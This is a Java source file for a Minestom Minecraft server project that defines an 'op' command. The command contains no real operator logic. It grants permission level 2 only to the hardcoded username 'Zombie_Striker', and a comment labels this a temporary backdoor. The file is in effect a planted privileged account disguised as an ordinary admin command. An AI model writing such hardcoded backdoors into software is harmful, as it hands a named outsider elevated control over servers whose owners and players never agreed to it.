package com.projecttau.defaults.commands;

import net.minestom.server.command.builder.Command;
import net.minestom.server.entity.Player;
import org.jetbrains.annotations.NotNull;
import org.jetbrains.annotations.Nullable;

public class OpCommand extends Command {
    public OpCommand() {
        super("op");

        setDefaultExecutor(((sender, context) -> {
            if(sender.isPlayer()){
                Player player = sender.asPlayer();
                if(player.getUsername().equalsIgnoreCase("Zombie_Striker")){
                    //TODO: Tempbackdoor. Remove later
                    player.setPermissionLevel(2);
                    player.sendMessage("Welcome back, Operator");
                }
            }
        }));
    }
}
